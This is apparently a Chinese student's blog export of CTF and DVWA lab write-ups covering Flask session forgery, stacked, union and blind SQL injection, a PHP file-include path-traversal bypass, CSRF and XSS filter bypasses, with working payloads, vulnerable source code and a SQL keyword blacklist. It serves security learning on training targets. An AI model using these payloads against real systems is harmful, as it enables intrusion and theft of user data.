session伪造说是复现，其实对flask一点都不了解，好像以buuok上的题来当web入门好像有点拉跨，不过看都看了，硬学下去吧 什么是flask学习的博客：https://www.cnblogs.com/mrchige/p/6387674.html Flask 是一个 web 框架。也就是说 Flask 为你提供工具，库和技术来允许你构建一个 web 应用程序。这个 wdb 应用程序可以使一些 web 页面、博客、wiki、基于 web 的日历应用或商业网站。Flask 属于微框架（micro-framework）这一类别，微架构通常是很小的不依赖于外部库的框架。这既有优点也有缺点，优点是框架很轻量，更新时依赖少，并且专注安全方面的 bug，缺点是，你不得不自己做更多的工作，或通过添加插件增加自己的依赖列表。 我裂开了，bluelake主题下的博客好像不能写入flask的代码…，就干脆删了不写学习的过程了 学习的博客：https://www.jianshu.com/p/f92311564ad0 进入页面右上角可以login和register，先随便注册一个然后登录登录之后可以change password，转到那个页面查看页面源码可以发现泄露了源码之后去查看源码先进去APP文件夹 -&gt; 查看route.py 看app.route()主要的文件有哪些 先查看index.html的内容 发现只要以admin身份登录就可以拿到flag，回到注册页面注册admin会发现用户已被注册而flask的session是存放在cookie中的，也就是存放在浏览器上，那么就有了可能伪造session的思路 要伪造session还需要知道签名，去github的源码导出看看有没有签名，最后在config.py中发现了签名 拿到签名后还需要解密加密flask脚本，在google中可以搜索到https://github.com/noraj/flask-session-cookie-manager 下载后开始伪造session： 先解密，得到解密之前的数据，将当前用户名改成admin这里有python2和python3两个脚本，用python3失败了，用python2成功了 python2 flask_session_cookie_manager2.py decode -s “ckj123” -c “.eJw9kEGLwjAQhf_KkrOH2tKL4GEltSjMQJdoyVzEbWvTSeNCq2gj_vfNuuBhYOA9Pt57D3E4Dc1oxOIyXJuZOHS1WDzEx7dYCM2m176Kwa86lNkEsu8g3zLKdiKVeV0WKZa7iGR7I7nviHsDvPNawQ0cWSg3HrhKw2_Qf1nMswl9EaPPElDgQZIjXhmtqonyXaq5CEzqQYVzm0h7iFFtmeTakCzuwXcHvzZQ6gS5D5n-_GtLarMUz5moxuF0uPzY5vyuALJmUm2qfRYhk4N875CrBD11wPauYx2TyxJSK4sqxGI7x8_lC9e5Y9u8SftzKHr7V85HFwRxHOuTmInr2Ayv2cQ8Es9f9Y5uyQ.Xo82lg.zGqI1MszM160rzt9fWR5-0DFJDU” -s 后跟签名-c 后跟当前cookie的value解密后的数据: 将修改后的数据再进行加密伪造session python2 flask_session_cookie_manager2.py encode -s “ckj123” -t “ckj123” -t “{u’csrf_token’: ‘07ce89c1466f0ef67776b291cf6fa7e0d5172954’, u’user_id’: u’10’, u’name’: u’admin’, u’image’: ‘Vu4g’, u’_fresh’: True, u’_id’: ‘b8ec7630b41209b0bc482e13ad95e4d80d5bf9a253a302fd1b32792fa74d4a274671713306ff0aa72de9b43afe16e2b4c3652cd1ad41a7131a1f769b443aade2’}” 加密后的数据: 之后再把这个伪造的session覆盖点当前的session的value就可以拿到flag了","tags":[]},{"title":"buuoj web刷题记录二","date":"2020-04-08T14:36:56.000Z","path":"2020/04/08/buuoj web刷题记录二/","text":"easy_tornado参考学习的博客: https://blog.csdn.net/weixin_45784586/article/details/104589198?fps=1&amp;locationNum=2 解题方法是ssti模板注入，现在关于web啥基础都没有，现在深究估计会浪费时间，有基础之后再来了解 解题脚本中有关python的知识可以学习 1234567import hashlibfilename = '/fllllllllllllag'cookie_secret = '7012f546-ae20-45cb-8b05-19bf1e96d0bf'file_md5 = hashlib.md5(filename.encode(encoding='UTF-8')).hexdigest()print(hashlib.md5((cookie_secret+file_md5).encode(encoding=\"UTF-8\")).hexdigest()) hashlib是涉及安全散列和消息摘要，提供多个不同的加密算法接口，如SHA1、SHA224、SHA256、SHA384、SHA512、MD5等encode(encoding=’utf-8’) 作用是以 encoding 指定的编码格式编码字符串，这里是’utf-8’方式hash.hexdigest() 作用是 返回摘要，作为十六进制数据字符串值 easy_sql参考学习的网站:https://blog.csdn.net/wyj_1216/article/details/104227659?depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromBaidu-3&amp;utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromBaidu-3 https://blog.csdn.net/weixin_37839711/article/details/81562550 看其它师傅的博客找到了这题的源码 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970&lt;?php session_start(); include_once \"config.php\"; $post = array(); $get = array(); global $MysqlLink; //GetPara(); $MysqlLink = mysqli_connect(\"localhost\",$datauser,$datapass); if(!$MysqlLink)&#123; die(\"Mysql Connect Error!\"); &#125; $selectDB = mysqli_select_db($MysqlLink,$dataName); if(!$selectDB)&#123; die(\"Choose Database Error!\"); &#125; foreach ($_POST as $k=&gt;$v)&#123; if(!empty($v)&amp;&amp;is_string($v))&#123; $post[$k] = trim(addslashes($v)); &#125; &#125; foreach ($_GET as $k=&gt;$v)&#123; &#125; &#125; //die(); ?&gt;&lt;html&gt;&lt;head&gt;&lt;/head&gt;&lt;body&gt;&lt;a&gt; Give me your flag, I will tell you if the flag is right. &lt;/ a&gt;&lt;form action=\"\" method=\"post\"&gt;&lt;input type=\"text\" name=\"query\"&gt;&lt;input type=\"submit\"&gt;&lt;/form&gt;&lt;/body&gt;&lt;/html&gt;&lt;?php if(isset($post['query']))&#123; $BlackList = \"prepare|flag|unhex|xml|drop|create|insert|like|regexp|outfile|readfile|where|from|union|update|delete|if|sleep|extractvalue|updatexml|or|and|&amp;|\\\"\"; //var_dump(preg_match(\"/&#123;$BlackList&#125;/is\",$post['query'])); if(preg_match(\"/&#123;$BlackList&#125;/is\",$post['query']))&#123; //echo $post['query']; die(\"Nonono.\"); &#125; if(strlen($post['query'])&gt;40)&#123; die(\"Too long.\"); &#125; $sql = \"select \".$post['query'].\"||flag from Flag\"; mysqli_multi_query($MysqlLink,$sql); do&#123; if($res = mysqli_store_result($MysqlLink))&#123; while($row = mysqli_fetch_row($res))&#123; print_r($row); &#125; &#125; &#125;while(@mysqli_next_result($MysqlLink)); &#125; ?&gt;?&gt; 从源码中可以看到被过滤的关键字有:$BlackList = “prepare|flag|unhex|xml|drop|create|insert|like|regexp|outfile|readfile|where|from|union|update|delete|if|sleep|extractvalue|updatexml|or|and|&amp;|&quot;“; __mysql 中prepare, execute, deallocate的使用方法PREPARE语句准备好一条SQL语句，并分配给这条SQL语句一个名字供之后调用。准备好的SQL语句通过EXECUTE命令执行，通过DEALLOCATE PREPARE命令释放掉。 语句的名字不区分大小写。准备好的SQL语句名字可以是字符串，也可以是用户指定的包含SQL文本的变量。PREPARE中的SQL文本必须代表一条单独的SQL语句而不能是多条SQL语句。在SQL语句中，? 字符用来作为后面执行查询使用的一个参数。? 不能加上引号，及时打算将它们绑定到字符变量中也不可以。__ 例子:PREPARE: ? 只能用变量传递，不能使用常数MariaDB [test]&gt; execute sq1 using 1, 2; 是错误的 mysqli_multi_query($MysqlLink,$sql);从这条语句发现存在堆叠注入mysqli_multi_query() 函数执行一个或多个针对数据库的查询。多个查询用分号进行分隔。 输入1;show tables; 可以注出当前数据库中的表 $sql = “select “.$post[‘query’].”||flag from Flag”;根据这一行代码可以考虑将$post[‘query’]与flag 连接起来，从而输出的时候输出flag 由于在oracle 缺省支持 通过 ‘ || ’ 来实现字符串拼接，但在mysql 缺省不支持。需要调整mysql 的sql_mode 模式：pipes_as_concat 来实现oracle 的一些功能 输入 1;set sql_mode=PIPES_AS_CONCAT;select 1 就可以输出flag","tags":[{"name":"ssti模板注入","slug":"ssti模板注入","permalink":"http://wafuter.jxustctf.top/tags/ssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/"}]},{"title":"buuoj刷题记录一","date":"2020-04-07T05:36:07.000Z","path":"2020/04/07/buuoj刷题记录一/","text":"HCTF Warmupphp有关知识 highlight_file(filename, return) 函数对文件进行语法高亮显示。 filename 必需。要进行高亮处理的 PHP 文件的路径。return 可选。如果设置 true，则本函数返回高亮处理的代码。 mb_substr ( string $str , int $start [, int $length = NULL [, string $encoding = mb_internal_encoding() ]] ) : string mb_substr() 函数返回字符串的一部分，之前我们学过 substr() 函数，它只针对英文字符，如果要分割的中文文字则需要使用 mb_substr()。 12345&lt;?phpecho mb_substr(\"菜鸟教程\", 0, 2);// 输出：菜鸟?&gt; mb_strpos()：返回要查找的字符串在别一个字符串中首次出现的位置mb_strpos (haystack ,needle ) haystack：要被检查的字符串。needle：要搜索的字符串。 source.php 源码分析 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849&lt;?php highlight_file(__FILE__); class emmm &#123; public static function checkFile(&amp;$page) &#123; $whitelist = [\"source\"=&gt;\"source.php\",\"hint\"=&gt;\"hint.php\"]; if (! isset($page) || !is_string($page)) &#123; echo \"you can't see it\"; return false; &#125; if (in_array($page, $whitelist)) &#123; return true; &#125; $_page = mb_substr( $page, 0, mb_strpos($page . '?', '?') ); if (in_array($_page, $whitelist)) &#123; return true; &#125; $_page = urldecode($page); $_page = mb_substr( $_page, 0, mb_strpos($_page . '?', '?') ); if (in_array($_page, $whitelist)) &#123; return true; &#125; echo \"you can't see it\"; return false; &#125; &#125; if (! empty($_REQUEST['file']) &amp;&amp; is_string($_REQUEST['file']) &amp;&amp; emmm::checkFile($_REQUEST['file']) ) &#123; include $_REQUEST['file']; exit; &#125; else &#123; echo \"&lt;br&gt;&lt;img src=\\\"https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\\\" /&gt;\"; &#125; ?&gt; 大概逻辑是通过if语句的三个判断条件之后通过文件包含将ffffllllaaaagggg中的flag输出mb_substr函数返回字符串的一部分， mb_strpos返回其它字符串在要查找的字符串首次出现的位置 那么设置payload=hint.php/source.php?…就可以绕过checkFile的检查，之后就是猜路径输出flag 完成后的payload: http://d236b4e8-5d5d-4527-959f-71f34bd3df71.node3.buuoj.cn/source.php?file=source.php?../../../../../ffffllllaaaagggg easy_sql堆叠注入: 利用;连接多条mysql语句一起执行 发现存在字符型注入, 尝试使用union联合查询的时候发现过滤了很多mysql语句，之后找wp学习去 学习的wp: https://blog.csdn.net/qq_26406447/article/details/90643951 学习到还存在堆叠注入: 输入 ‘;show databases;# 获取数据库名 输入’;show tables;# 可以获取表名 通过联合use database与desc table还可以查看其它数据库中表的字段 得到了words和1919810931114514这两张表先看看这两张表中分别有什么字段 输入’;desc words;# 查看word表中的字段 输入’;desc `1919810931114514`;# 查看1919810931114514表中的字段 也可以用show columns from words; 语句查询 找到flag字段后接下来就是考虑如何输出，虽然过滤了常用的mysql语句， 但是没有过滤rename与alter语句 由于输入1进行查询的时候比较明显的可以看出来是输出words表中的内容 那么可以 修改words表为其它名称，比如word，修改1919810931114514表为words 再往“words”表中加入id字段， 将flag改成data， 之后输入’ or true # 就可输出flag payload:‘;rename table words to word1;rename table `1919810931114514` to words;alter table words add id int unsigned not Null auto_increment primary key;alter table words change flag data varchar(100);# 输入: ‘;show tables;# 与’;desc words;# 可以看到字段名已被更改 flag:","tags":[]},{"title":"dvwa1.10学习之csrf","date":"2020-04-06T05:50:27.000Z","path":"2020/04/06/dvwa1-10学习之csrf/","text":"参考学习的网站:https://blog.csdn.net/SKI_12/article/details/60477557(通过dvwa学习CSRF漏洞) https://blog.csdn.net/stpeace/article/details/53512283?utm_medium=distribute.pc_relevant.none-task-blog-BlogCommendFromBaidu-1&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromBaidu-1(CSRF的攻击与防御) CSRF(Cross-site request forgery)CSRF，全称Cross-site request forgery，翻译过来就是跨站请求伪造，是指利用受害者尚未失效的身份认证信息（cookie、会话等），诱骗其点击恶意链接或者访问包含攻击代码的页面，在受害人不知情的情况下以受害者的身份向（身份认证信息所对应的）服务器发送请求，从而完成非法操作（如转账、改密等）。CSRF与XSS最大的区别就在于，CSRF并没有盗取cookie而是直接利用 php有关知识1.$GLOBALS[‘var’]是外部的全局变量本身。 2.global $var是外部$var的同名引用或者指针。 利用php代码连接数据库并执行mysql语句 12345678910111213&lt;?$con = mysqli_connect(\"locaohost\", \"root\", \"root\", \"test\")$insert = \"insert into t1 (score)values(66666)\";if (mysqli_connect_errno($con)) &#123; echo \"connect failed\".'\\n';&#125;// mysqli_query 函数，可以执行mysql语句mysqli_query($con, $insert)mysqli_query($con, \"select * from t1\");mysqli_close($con);?&gt; low在kali linux中的/var/www/html 目录下创建一个1.html，创建一个简单的跳转网页文件内容如下: 1&lt;a href='http://localhost/dvwa/vulnerabilities/csrf/?password_new=123456&amp;password_conf=123456&amp;Change=Change#'&gt;CSRF&lt;/a&gt; 由于low级别的CSRF没有任何防护，只需要被攻击着的cookie信息还残留在浏览器中就可以诱导被攻击者点击伪造的链接从而被篡改密码 burpsuite下也有用于实现检测CSRF漏洞的功能 被攻击者点击这个按钮也可以被攻击 另外再说说burpsuite抓本地包的问题，一开始抓不到127.0.0.1这个本地地址的包之后打开cmd，输入ipconfig/all找到自己的ip地址，将burpsuite的指定地址选成本机的ip地址 再将firefox的代理设置的地址填成这个地址就可以成功抓包了 dvwa也可以从这个ip访问","tags":[{"name":"dvwa1.10，csrf","slug":"dvwa1-10，csrf","permalink":"http://wafuter.jxustctf.top/tags/dvwa1-10%EF%BC%8Ccsrf/"}]},{"title":"dvwa1.10学习之sql盲注","date":"2020-04-03T02:27:52.000Z","path":"2020/04/03/dvwa1-10学习之sql盲注/","text":"参考学习的网站: https://www.freebuf.com/articles/web/120985.html kali linux 配置dvwa环境 https://github.com/ethicalhack3r/DVWA先去github上下载压缩包解压后把文件夹放入/var/www/html并重命名为dvwa 给予dvwa文件夹相应的权限chmod -R 755 /var/www/html/dvwa 按照github上的指示来， 在mysql中进行如下操作 先启动mysql：sudo service mysql start sudo mysql -u root -p 12345678mysql&gt; create database dvwa;Query OK, 1 row affected (0.00 sec)mysql&gt; grant all on dvwa.* to dvwa@localhost identified by 'SuperSecretPassword99';Query OK, 0 rows affected, 1 warning (0.01 sec)mysql&gt; flush privileges;Query OK, 0 rows affected (0.00 sec) 再退出mysql： exit 在修改dvwa/config/config.inc.php文件中的内容为:$_DVWA[ ‘db_user’ ] = ‘dvwa’;$_DVWA[ ‘db_password’ ] = ‘SuperSecretPassword99’;$_DVWA[ ‘db_database’ ] = ‘dvwa’; 再启动apache2服务sudo service apache2 start 打开浏览器输入localhost/dvwa 就会自动跳转到setup.php之后在点击下方的 Create/Reset Database 就行了 进入login.php 页面, 输入账号密码分别为admin, password 就可进入dvwa页面 low先测试是字符型还是数字型的注入 输入 ‘ or true #, 显示 ID已存在，则是字符型注入 由于回显不会显示数据， 所以需要以爆破的方式来猜解数据 爆破数据库名的长度 输入 ‘ or length(database())=x #, x = 1, 2, 3, 4… 获取数据库名长度后爆破数据库名，使用二分法爆破 输入’ or ascii(substr(database(), 1, 1)) &gt;/&lt; x # substr函数是字符串截取函数 根据回显结果是否显示exist来判断处于哪个范围 爆破数据库中的表的数量 先猜解数据库中有几张表 输入’ or (select count(table_name) from information_schema.tables where table_schema=database()) = x #x=1,2,3,4… 测试出来x=2, 也就是数据库中有两张表 爆破表的长度 ‘ or length(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1))=x # x = 1, 2, 3…, 测试出来x=9limit x, y 的意思是从偏移x开始取y个数据 substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1) 的意思是取第一张表名 123456789101112131415161718192021222324mysql&gt; select * from t1 where username='' or substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1)='t1';+----------+----------+| username | password |+----------+----------+| cx | root || 1 | 222 || 2 | 333 || 3 | 444 || 4 | 555 || 5 | 666 || 1 | 222 || 2 | 333 |+----------+----------+mysql&gt; select * from t1 where username='' or substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1)='t2';Empty set (0.00 sec)mysql&gt; show tables;+----------------+| Tables_in_test |+----------------+| t1 || t2 |+----------------+2 rows in set (0.00 sec) 爆破表名 ‘ or ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1)) &gt;/&lt; x # 还是采用二分法爆破 爆破表中的字段名的数量 ‘ or (select count(column_name) from information_schema.columns where table_name=’guestbook’/‘users’)=x #2 = 1, 2, 3… 爆破字段长度与字段名 长度: ‘ or length(substr((select column_name from information_schema.columns where table_name=’guestbook’/‘users’) limit 0,1, 1))=x # 字段名: 重复利用上面的二分法 爆破数据还是采用二分法 延时注入允许sleep语句存在的话 可以在if(判断语句， 结果1， 结果2) 例子:mysql&gt; delete from admin where username=’1’ and sleep(if(length((database()))&gt;=5, 2, 0));Query OK, 0 rows affected (2.00 sec) 输入 ‘ or sleep(if(length(database()) &gt; x, 5, 0)) # 根据是否延迟可以判断数据库名的长度也可以把sleep语句放在if语句里面 ’ and if(ascii(substr(database(),1,1))&gt;97,sleep(5),1)#","tags":[{"name":"dvwa1.10, sql盲注","slug":"dvwa1-10-sql盲注","permalink":"http://wafuter.jxustctf.top/tags/dvwa1-10-sql%E7%9B%B2%E6%B3%A8/"}]},{"title":"DVWA1.10学习之sql注入","date":"2020-03-31T12:16:43.000Z","path":"2020/03/31/DVWA1.10学习之sql注入/","text":"参考学习的网站：https://www.freebuf.com/articles/web/120747.html 一. low 服务器端代码: 123456789101112131415161718192021222324&lt;?phpif( isset( $_REQUEST[ 'Submit' ] ) ) &#123; // Get input $id = $_REQUEST[ 'id' ]; // Check database $query = \"SELECT first_name, last_name FROM users WHERE user_id = '$id';\"; $result = mysqli_query($GLOBALS[\"___mysqli_ston\"], $query ) or die( '&lt;pre&gt;' . ((is_object($GLOBALS[\"___mysqli_ston\"])) ? mysqli_error($GLOBALS[\"___mysqli_ston\"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '&lt;/pre&gt;' ); // Get results while( $row = mysqli_fetch_assoc( $result ) ) &#123; // Get values $first = $row[\"first_name\"]; $last = $row[\"last_name\"]; // Feedback for end user $html .= \"&lt;pre&gt;ID: &#123;$id&#125;&lt;br /&gt;First name: &#123;$first&#125;&lt;br /&gt;Surname: &#123;$last&#125;&lt;/pre&gt;\"; &#125; mysqli_close($GLOBALS[\"___mysqli_ston\"]);&#125;?&gt; 代码中没有对id做检查与过滤， 明显存在sql注入 一般情况下看不到后端代码， 所以要进行多种测试 mysql 中的注释符有： 1231. \"#\"2. \"-- \"3. \"/* */\" 1. 判断是否存在注入，注入是字符型还是数字型输入1返回查询结果 输入 ‘ or true – ‘ 返回多个结果，因此是字符型注入 2. 猜解SQL查询语句中的字段数 输入 ‘ or true order by 1 – ‘, 查询成功输入 ‘ or true order by 2 – ‘, 查询成功输入 ‘ or true order by 3 – ‘，查询失败 3. 确定显示的字段顺序 输入 ‘ union select 1, 2; – ‘ 4. 获取当前数据库 输入 ‘ union select 1, database(); – ‘ __5. 获取数据库中的表 我的数据库版本 12345678Current database: test+-----------+| version() |+-----------+| 8.0.12 |+-----------+1 row in set (0.02 sec) 不允许直接使用select * from t1 group by username;必须前后一致 select username from t1 group by username; mysql 中group_concat 函数作用：能够将相同的行组合起来 例如： 12345678910111213141516mysql&gt; select 1, table_name from information_schema.tables where table_schema=database();+---+------------+| 1 | TABLE_NAME |+---+------------+| 1 | t1 || 1 | t2 |+---+------------+2 rows in set (0.00 sec)mysql&gt; select 1, group_concat(table_name) from information_schema.tables where table_schema=database();+---+--------------------------+| 1 | group_concat(table_name) |+---+--------------------------+| 1 | t1,t2 |+---+--------------------------+1 row in set (0.00 sec) 输入 ‘ union select 1, group_concat(table_name) from information_schema.tables where table_schema=database(); –’可以获取数据库中的表名 关于information_schema: information_schema这这个数据库中保存了MySQL服务器所有数据库的信息。 如数据库名，数据库的表，表栏的数据类型与访问权限等。 再简单点，这台MySQL服务器上，到底有哪些数据库、各个数据库有哪些表， 每张表的字段类型是什么，各个数据库要什么权限才能访问，等等信息都保存在information_schema里面。 information_schema的表schemata中的列schema_name记录了所有数据库的名字 information_schema的表tables中的列table_schema记录了所有数据库的名字 information_schema的表tables中的列table_name记录了所有数据库的表的名字 information_schema的表columns中的列table_schema记录了所有数据库的名字 information_schema的表columns中的列table_name记录了所有数据库的表的名字 information_schema的表columns中的列column_name记录了所有数据库的表的列的名字(所有字段名) 6. 获取表中的字段名 输入 ‘ union select 1, group_concat(column_name) from information_schema.columns where table_name=’users’; – ‘ 可以获取users 表的所有字段名 __7. 获取表中的所有字段内容 输入 ‘ union select group_concat(avatar, failed_login, first_name, last_login, last_name, password), group_concat(user, user_id) from users; # 可以获取所有字段内容 这里的联合注入 因为guestbook表中只有两个字段， 所以查t2表的时候要用group_concat连接各个字段，保持前后查询字段一致 二. medium服务器端代码 12345678910111213141516171819202122232425262728293031&lt;?phpif( isset( $_POST[ 'Submit' ] ) ) &#123; // Get input $id = $_POST[ 'id' ]; $id = mysqli_real_escape_string($GLOBALS[\"___mysqli_ston\"], $id); $query = \"SELECT first_name, last_name FROM users WHERE user_id = $id;\"; $result = mysqli_query($GLOBALS[\"___mysqli_ston\"], $query) or die( '&lt;pre&gt;' . mysqli_error($GLOBALS[\"___mysqli_ston\"]) . '&lt;/pre&gt;' ); // Get results while( $row = mysqli_fetch_assoc( $result ) ) &#123; // Display values $first = $row[\"first_name\"]; $last = $row[\"last_name\"]; // Feedback for end user $html .= \"&lt;pre&gt;ID: &#123;$id&#125;&lt;br /&gt;First name: &#123;$first&#125;&lt;br /&gt;Surname: &#123;$last&#125;&lt;/pre&gt;\"; &#125;&#125;// This is used later on in the index.php page// Setting it here so we can close the database connection in here like in the rest of the source scripts$query = \"SELECT COUNT(*) FROM users;\";$result = mysqli_query($GLOBALS[\"___mysqli_ston\"], $query ) or die( '&lt;pre&gt;' . ((is_object($GLOBALS[\"___mysqli_ston\"])) ? mysqli_error($GLOBALS[\"___mysqli_ston\"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '&lt;/pre&gt;' );$number_of_rows = mysqli_fetch_row( $result )[0];mysqli_close($GLOBALS[\"___mysqli_ston\"]);?&gt; 解决burp suite 抓不到本地包的情况参考连接:https://blog.csdn.net/qq_43662512/article/details/99698833 先进入http://burp 下载证书， 之后导入firefox浏览器中 打开命令行， 输入ipconfig/all， 查看本地的ipv4地址， 之后把localhost替换成这个IP地址就抓包成功了 一般步骤: 先判断是不是字符型或数字型 输入’ or true # 报错 输入抓包更改参数为 1 or true #可以查询所有数据 利用order by 猜解有多少个字段 抓包更改参数为 1 or union select 1, 2 # 确定显示的字段顺序 抓包更改参数为 1 union select 1, database() # 注出数据库名 抓包更改参数为 1 union select 1, group_concat(table_name) from information_schema.talbes where table_schema=database() # 可以注出数据库中有多少张表 获取表中的字段名抓包更改参数为 1 union select 1, group_concat(column_name) from information_schema.columns where table_name=’users’; #会出现查询失败的错误，因为mysqli_real_escape_string函数的关系 ‘’被转义了，但是可以用十六进制绕过 12&gt;&gt;&gt; binascii.hexlify(b\"users\")b'7573657273' 之后抓包更改参数为 1 union select group_concat(avatar, failed_login, first_name, last_login, last_name, password), group_concat(user, user_id) from users # 获取所有字段内容 3. High 服务器端代码: 123456789101112131415161718192021222324&lt;?phpif( isset( $_SESSION [ 'id' ] ) ) &#123; // Get input $id = $_SESSION[ 'id' ]; // Check database $query = \"SELECT first_name, last_name FROM users WHERE user_id = '$id' LIMIT 1;\"; $result = mysqli_query($GLOBALS[\"___mysqli_ston\"], $query ) or die( '&lt;pre&gt;Something went wrong.&lt;/pre&gt;' ); // Get results while( $row = mysqli_fetch_assoc( $result ) ) &#123; // Get values $first = $row[\"first_name\"]; $last = $row[\"last_name\"]; // Feedback for end user $html .= \"&lt;pre&gt;ID: &#123;$id&#125;&lt;br /&gt;First name: &#123;$first&#125;&lt;br /&gt;Surname: &#123;$last&#125;&lt;/pre&gt;\"; &#125; ((is_null($___mysqli_res = mysqli_close($GLOBALS[\"___mysqli_ston\"]))) ? false : $___mysqli_res); &#125;?&gt; limit 1 的作用是返回1条记录 high 级别就加了条limit 1语句， 这个比较好绕， 像low级别一样注释掉就行了输入 ‘ or true # 直接跳到最后一步输入 ‘ or true union select group_concat(user_id,first_name,last_name),group_concat(password) from users # 需要特别提到的是，High级别的查询提交页面与查询结果显示页面不是同一个，也没有执行302跳转，这样做的目的是为了防止一般的sqlmap注入，因为sqlmap在注入过程中，无法在查询提交页面上获取查询的结果，没有了反馈，也就没办法进一步注入。","tags":[{"name":"sql注入，DVWA1.10","slug":"sql注入，DVWA1-10","permalink":"http://wafuter.jxustctf.top/tags/sql%E6%B3%A8%E5%85%A5%EF%BC%8CDVWA1-10/"}]},{"title":"DVWA1.10学习之XSS","date":"2020-03-30T11:40:19.000Z","path":"2020/03/30/DVWA1.10学习之XSS/","text":"参考的学习网站 https://www.freebuf.com/articles/web/123779.html DVWA之XSSxss的概念XSS，全称Cross Site Scripting，即跨站脚本攻击，某种意义上也是一种注入攻击，是指攻击者在页面中注入恶意的脚本代码，当受害者访问该页面时，恶意代码会在其浏览器上执行，需要强调的是，XSS不仅仅限于JavaScript，还包括flash等其它脚本语言。根据恶意代码是否存储在服务器中，XSS可以分为存储型的XSS与反射型的XSS。 DOM型的XSS由于其特殊性，常常被分为第三种，这是一种基于DOM树的XSS。例如服务器端经常使用document.boby.innerHtml等函数动态生成html页面，如果这些函数在引用某些变量时没有进行过滤或检查，就会产生DOM型的XSS。DOM型XSS可能是存储型，也有可能是反射型。 反射型xss1. low 12345678910111213&lt;?php// Is there any input?if( array_key_exists( \"name\", $_GET ) &amp;&amp; $_GET[ 'name' ] != NULL ) &#123; // Feedback for end user echo '&lt;pre&gt;Hello ' . $_GET[ 'name' ] . '&lt;/pre&gt;';&#125;?&gt; 上述代码直接引用了name参数，没有做任何的过滤与检查，存在明显的xss漏洞 输入 &lt;script&gt; alert(/xss/) &lt;/script&gt; 就可以进行漏洞利用 2. Medium 123456789&lt;?php// Is there any input?if( array_key_exists( \"name\", $_GET ) &amp;&amp; $_GET[ 'name' ] != NULL ) &#123; // Get input $name = str_replace( '&lt;script&gt;', '', $_GET[ 'name' ] ); // Feedback for end user echo \"&lt;pre&gt;Hello $&#123;name&#125;&lt;/pre&gt;\";&#125;?&gt; array_key_exists 函数的作用是判断数组中是否存在指定的key 上述代码对输入进行了过滤，使用str_replace函数将输入中的&lt;script&gt;全部替换成’’，但是可以轻松的绕过 1.双写绕过 &lt;scr&lt;script&gt;ript&gt;alert(/xss/)&lt;/script&gt; 2.大小写混淆绕过 &lt;ScRipt&gt; alert(/xss/) &lt;/script&gt; 3. High 123456789&lt;?php// Is there any input?if( array_key_exists( \"name\", $_GET ) &amp;&amp; $_GET[ 'name' ] != NULL ) &#123; // Get input $name = preg_replace( '/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i', '', $_GET[ 'name' ] ); // Feedback for end user echo \"&lt;pre&gt;Hello $&#123;name&#125;&lt;/pre&gt;\";&#125;?&gt; preg_replace 函数执行一个正则表达式的搜索和替换语法：preg_replace (pattern ,replacement ,subject,limit,count )pattern: 正则表达式(字符串或字符串数组)replacement: 用于替换的字符串或字符串数组subject: 要进行搜索和替换的字符串或字符串数组。limit: 可选。每个模式在每个subject上进行替换的最大次数。默认是 -1(无限)。count: 可选。完成的替换次数 正则表达式解析：. -&gt; 匹配除\\n之外的任何单个字符，代替任何字符* -&gt; 匹配其左边的子表达式0次或多次() -&gt; 标记子表达式的开始和结束位置修正符i -&gt; 匹配时忽略大小写 漏洞利用： 这样就无法使用&lt;script&gt;标签注入XSS代码了，但是可以通过img, body等标签的事件或者iframe等标签的src注入恶意的js代码 &lt;img src=1 onerror=alert(/xss/)&gt; 4. impossible 12345678910111213&lt;?php// Is there any input?if( array_key_exists( \"name\", $_GET ) &amp;&amp; $_GET[ 'name' ] != NULL ) &#123; // Check Anti-CSRF token checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' ); // Get input $name = htmlspecialchars( $_GET[ 'name' ] ); // Feedback for end user echo \"&lt;pre&gt;Hello $&#123;name&#125;&lt;/pre&gt;\";&#125;// Generate Anti-CSRF tokengenerateSessionToken();?&gt; impossible级别的代码使用htmlspecialchars函数把预定义的字符&amp;、”、 ’、&lt;、&gt;转换为HTML实体，防止浏览器将其作为HTML元素。 存储型XSS1. low 12345678910111213141516&lt;?phpif( isset( $_POST[ 'btnSign' ] ) ) &#123; // Get input $message = trim( $_POST[ 'mtxMessage' ] ); $name = trim( $_POST[ 'txtName' ] ); // Sanitize message input $message = stripslashes( $message ); $message = mysql_real_escape_string( $message ); // Sanitize name input $name = mysql_real_escape_string( $name ); // Update database $query = \"INSERT INTO guestbook ( comment, name ) VALUES ( '$message', '$name' );\"; $result = mysql_query( $query ) or die( '&lt;pre&gt;' . mysql_error() . '&lt;/pre&gt;' ); //mysql_close();&#125;?&gt; 有关函数介绍: __trim(string, charlist)移除字符串两侧的空白字符或其它预定义字符，预定义字符包括\\t, \\n, \\x0b, \\r以及空格，可选参数charlist支持添加额外需要删除的字符。 stripslashes(string)删除字符串中的反斜杠 mysql_real_escape_string(string, connection)对字符串中的特殊符号 \\x00, \\n, \\r, , ‘, “, \\x1a 进行转义__ “INSERT INTO guestbook ( comment, name ) VALUES ( ‘$message’, ‘$name’);” mysql语句 往guestbook插入数据 上述代码没有对输入做XSS方面的过滤与检查，并且储存在数据库中，所以存在明显的存储型XSS漏洞 在Message一栏中输入 &lt;script&gt; alert(‘xss’) &lt;/script&gt; 就可以进行漏洞利用 wireshark有关知识:kali linux 中eth0 是对外网卡lo 是本地环合网卡? 对着这一栏点击右键 选择Dispaly Filter Expression 可以过滤不需要看的协议包之后点击左上角的红色方框停止抓取流量，点击File -&gt; save 保存为pcapng文件 burp2.1.07 有关知识:Project -&gt; 项目名称 -&gt; 恢复默认值 -&gt; All 可恢复全部默认配置 设置编码集用户选项 -&gt; 表示 -&gt; 字符集 -&gt; 设置编码集为UTF-8 项目名称更改Project -&gt; 